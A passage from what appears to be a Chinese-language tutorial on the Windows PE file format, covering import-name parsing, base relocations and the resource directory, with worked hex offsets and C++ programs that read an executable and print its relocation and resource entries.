class="built_in">RvaToFoa</span>(lpImage, pImportTable-&gt;FirstThunk);</span><br><span class="line">pNameTable = (PIMAGE_THUNK_DATA32)(lpImage + Foa);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2.3 开始解析名字</span></span><br><span class="line"><span class="keyword">while</span> (pNameTable-&gt;u1.Ordinal!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//2.3.1 判断最高位是不是1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IMAGE_SNAP_BY_ORDINAL32</span>(pNameTable-&gt;u1.Ordinal)==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//只有序号</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  序号:%x,名称:NULL\n&quot;</span>, pNameTable-&gt;u1.Ordinal&amp;<span class="number">0x7FFFFFFF</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//既有名字，又有序号</span></span><br><span class="line">DWORD dwNameFoa = <span class="built_in">RvaToFoa</span>(lpImage, pNameTable-&gt;u1.AddressOfData);</span><br><span class="line">PIMAGE_IMPORT_BY_NAME pName  = (PIMAGE_IMPORT_BY_NAME)(dwNameFoa + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  序号:%x,名称:%s\n&quot;</span>, pName-&gt;Hint,pName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line">pNameTable++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------\n&quot;</span>);</span><br><span class="line">pImportTable++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><h4 id="什么叫做重定位"><a href="#什么叫做重定位" class="headerlink" title="什么叫做重定位"></a>什么叫做重定位</h4><p>一般情况下，exe的默认加载基址是0x0040 0000</p><p>会有一些代码，是这样的：</p><p>lea eax, ds:[0x0040 1100]</p><p>push eax</p><p>call printf</p><p>但是目前来看，几乎都不会加载到默认基址上。</p><p>比如说，exe加载到0x0050 0000上，那么以上的代码还对么？？</p><p>不对了，怎么才能对呢？？</p><p>lea eax, ds:[0x0050 1100]</p><p>push eax</p><p>call printf</p><p>这样就对了。</p><p>由于一个模块加载到什么位置，几乎是不确定的，所以每次程序运行，都需要将使用了VA的地方进行一次修改。这个修改的过程就称之为重定位。</p><p>有一个区域就记录着，程序中的哪些位置使用了VA。这个区域就叫做重定位表。</p><p>为什么模块不加载到默认基址上？？</p><ol><li>对于dll来说，他默认基址上经常已经被别的模块使用了。</li><li>对于exe来说，每次都加载到默认基址，是一个危险的行为。数据和代码的地址每次都是固定的，就很危险。对于exe来说，就有一个随机基址的功能，使得每次运行，基址都不一样。</li></ol><h4 id="手工解析重定位"><a href="#手工解析重定位" class="headerlink" title="手工解析重定位"></a>手工解析重定位</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_BASE_RELOCATION</span> &#123;</span><br><span class="line">    DWORD   VirtualAddress;<span class="comment">// (1) 需重定位数据的起始RVA</span></span><br><span class="line">    DWORD   SizeOfBlock;<span class="comment">// (2) 本结构与TypeOffset总大小</span></span><br><span class="line"><span class="comment">//  WORD    TypeOffset[1];// (3) 原则上不属于本结构</span></span><br><span class="line">&#125; IMAGE_BASE_RELOCATION;</span><br><span class="line"><span class="keyword">typedef</span>  IMAGE_BASE_RELOCATION UNALIGNED IMAGE_BASE_RELOCATION;</span><br></pre></td></tr></table></figure><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/16.png" alt="image-16"></p><p>VirtualAddress:0A9000 ——-&gt;FOA:76E00</p><p>size:3ACC</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/17.png" alt="image-17"></p><p>VirtualAddress:031000</p><p>SizeofBlock:30</p><div class="table-container"><table><thead><tr><th>数据</th><th>偏移</th><th>重定位位置</th><th>FOA</th><th>要重定位的数据</th></tr></thead><tbody><tr><td>3A7F</td><td>A7F</td><td>031000+A7F</td><td>2E7F</td><td>004A4840</td></tr><tr><td>3A85</td><td>A85</td><td>031000+A85</td><td>2E85</td><td>0048FC88</td></tr><tr><td>3A92</td><td>A92</td><td>031000+A92</td><td>2E92</td><td>004A4844</td></tr></tbody></table></div><p>咱们再OD中，去看RVA是031000+A7F的地址，发现确实是被重定位过的了。</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/18.png" alt="image-18"></p><p>怎么重定位的呢？？</p><p>原始VA - 默认基址 = 新VA - 新基址</p><p>验证：</p><p>0x00D6 0000 - 0x0040 0000 + 004A4840 得到就是0xE04840</p><h4 id="测试代码-1"><a href="#测试代码-1" class="headerlink" title="测试代码"></a>测试代码</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">L&quot;C:\\Users\\hugan\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeReloc</span><span class="params">(<span class="type">char</span>* lpImage)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">setlocale</span>(LC_ALL, <span class="string">&quot;chs&quot;</span>);</span><br><span class="line"><span class="comment">//1 打开文件</span></span><br><span class="line">HANDLE hFile = <span class="built_in">CreateFile</span>(</span><br><span class="line">PATH,</span><br><span class="line">GENERIC_ALL,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = <span class="built_in">GetFileSize</span>(hFile, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line"><span class="type">char</span>* buf = <span class="keyword">new</span> <span class="type">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ReadFile</span>(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">IsPE_File</span>(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;这是一个PE文件&quot;);</span></span><br><span class="line"><span class="built_in">AnalyzeReloc</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;这不是一个PE文件&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">delete</span>[]buf;</span><br><span class="line">buf = <span class="literal">nullptr</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt; dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">IsPE_File</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">TYPEOFFSET</span> &#123;</span><br><span class="line">WORD OFFSET : <span class="number">12</span>;</span><br><span class="line">WORD TYPE : <span class="number">4</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">AnalyzeReloc</span><span class="params">(<span class="type">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1. 找到重定位的结构体</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//1. 得到了重定位的数据目录</span></span><br><span class="line">PIMAGE_DATA_DIRECTORY pRelocDir = &amp;pOption-&gt;DataDirectory[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//2. 得到重定位表</span></span><br><span class="line">PIMAGE_BASE_RELOCATION pReloc = </span><br><span class="line">(PIMAGE_BASE_RELOCATION)</span><br><span class="line">(<span class="built_in">RvaToFoa</span>(lpImage, pRelocDir-&gt;VirtualAddress)+ lpImage);</span><br><span class="line"><span class="comment">//3. 开始解析重定位</span></span><br><span class="line"><span class="keyword">while</span> (pReloc-&gt;SizeOfBlock!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//得到描述每一个位置偏移的数组</span></span><br><span class="line">TYPEOFFSET* typeoffset = (TYPEOFFSET*)(pReloc + <span class="number">1</span>);</span><br><span class="line">DWORD dwCount = (pReloc-&gt;SizeOfBlock - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">DWORD dwBeginRva =  pReloc-&gt;VirtualAddress;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; dwCount; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (typeoffset[i].TYPE==<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwRelocRva = (dwBeginRva + typeoffset[i].OFFSET);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要重定位的位置RVA：%p\n&quot;</span>, dwRelocRva);</span><br><span class="line">PDWORD pRelocData = (PDWORD)(<span class="built_in">RvaToFoa</span>(lpImage, dwRelocRva) + lpImage);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;要重定位的数据：%p\n&quot;</span>, *pRelocData);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;类型是%d&quot;</span>, typeoffset[i].TYPE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----------------------------------\n&quot;</span>);</span><br><span class="line"><span class="comment">//找到下一个0x1000字节重定位信息</span></span><br><span class="line">pReloc = (PIMAGE_BASE_RELOCATION)((<span class="type">char</span>*)pReloc + pReloc-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="资源表"><a href="#资源表" class="headerlink" title="资源表"></a>资源表</h3><p>菜单，对话框，图标，光标，位图，工具栏…..他们称之为资源,资源就是PE文件在运行的时候需要使用到的一些通用数据。编译的时候，将他们独立保存在一个区域中。</p><p>记录这些区域的一个结构，就是资源表了。</p><h4 id="理解资源表"><a href="#理解资源表" class="headerlink" title="理解资源表"></a>理解资源表</h4><p>当咱们通过数据目录表找到资源表的时候，这个资源表分成了3层结构：</p><p>第一层：一共有多少种资源</p><p>第二层：这种资源有多少个</p><p>第三层：这个资源的位置</p><h4 id="手工解析PE文件"><a href="#手工解析PE文件" class="headerlink" title="手工解析PE文件"></a>手工解析PE文件</h4><h5 id="找到资源表"><a href="#找到资源表" class="headerlink" title="找到资源表"></a>找到资源表</h5><p>找到资源表的数据目录：</p><p>RVA:1AF000———–&gt; FOA:1A5400</p><p>SIZE:153058</p><h5 id="分析第一层"><a href="#分析第一层" class="headerlink" title="分析第一层"></a>分析第一层</h5><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/19.png" alt="image-29"></p><p><strong>NumberOfNamedEntries：0x2</strong></p><p><strong>NumberOfIdEntries：0xC</strong></p><p>代表着后面有14个下面的结构体：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_RESOURCE_DIRECTORY_ENTRY</span> &#123;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD NameOffset   :<span class="number">31</span>;<span class="comment">// (1) 资源名偏移</span></span><br><span class="line">            DWORD NameIsString:<span class="number">1</span>;<span class="comment">// (2) 资源名为字符串</span></span><br><span class="line">        &#125;;</span><br><span class="line">        DWORD   Name;<span class="comment">// (3) 资源/语言类型</span></span><br><span class="line">        WORD    Id;<span class="comment">// (4) 资源数字ID</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        DWORD   OffsetToData;<span class="comment">// (5) 数据偏移地址</span></span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            DWORD   OffsetToDirectory:<span class="number">31</span>;<span class="comment">// (6) 子目录偏移地址</span></span><br><span class="line">            DWORD   DataIsDirectory   :<span class="number">1</span>;<span class="comment">// (7) 数据为目录</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;IMAGE_RESOURCE_DIRECTORY_ENTRY,*PIMAGE_RESOURCE_DIRECTORY_ENTRY;</span><br></pre></td></tr></table></figure><p>第一个资源的信息：</p><p>Id：0x80008CC8 最高位是1，所以是以字符串为标识所以NameOffset：8CC8 这是一个相对于资源表起始位置的偏移</p><p>他不是RVA</p><p> 1A5400+8CC8 = 1AE0C8</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/20.png" alt="image-20"></p><p>OffsetToData：0x80 00 00 80 最高位为1，所以下一层是目录</p><p>OffsetToDirectory：80 这是一个相对于资源表起始位置的偏移</p><p> 他不是RVA</p><p>1A5400+80 = 1A5480</p><h5 id="这个就是第二层的位置"><a href="#这个就是第二层的位置" class="headerlink" title="这个就是第二层的位置"></a>这个就是第二层的位置</h5><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/21.png" alt="image-21"></p><p>Id：0x800095E0</p><p>NameOffset：95E0</p><p>1A5400+95E0 = 1AE9E0</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/22.png" alt="image-23"></p><p>OffsetToData：0x80001890</p><p>OffsetToDirectory：1890</p><p>1A5400+1890 = 1A6C90</p><h5 id="这个就是第三层的位置了"><a href="#这个就是第三层的位置了" class="headerlink" title="这个就是第三层的位置了"></a>这个就是第三层的位置了</h5><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/23.png" alt="image-23"></p><p>OffsetToData：5F20</p><p> 1A5400+5E20 =1AB220</p><p>和LordPE种解析出来的是一样的</p><p><img src="/2020/11/24/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/24.png" alt="image-24"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATH <span class="string">L&quot;C:\\Users\\SouLinker\\Desktop\\FileCleaner2.0.exe&quot;</span></span></span><br><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> std::map;</span><br><span class="line"></span><br><span class="line">map&lt;<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span>*&gt; g_mapResourceInfo;</span><br><span class="line">map&lt;<span class="type">const</span> <span class="type">char</span>*, <span class="type">const</span> <span class="type">char</span>*&gt; abc;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitResourceInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x1</span>] = <span class="string">&quot;Cursor&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x2</span>] = <span class="string">&quot;BitMap&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x3</span>] = <span class="string">&quot;Icon&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x4</span>] = <span class="string">&quot;Menu&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x5</span>] = <span class="string">&quot;Dialog&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x6</span>] = <span class="string">&quot;String Table&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x7</span>] = <span class="string">&quot;Font Directory&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x8</span>] = <span class="string">&quot;Font&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x9</span>] = <span class="string">&quot;Accelerators&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xA</span>] = <span class="string">&quot;UnFormatted&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xB</span>] = <span class="string">&quot;Message Table&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xC</span>] = <span class="string">&quot;Group Cursor&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0xE</span>] = <span class="string">&quot;Group Icon&quot;</span>;</span><br><span class="line">g_mapResourceInfo[<span class="number">0x10</span>] = <span class="string">&quot;Version Information&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="type">char</span>* lpImage, DWORD dwRva)</span></span>;</span><br><span class="line"><span class="function">BOOL <span 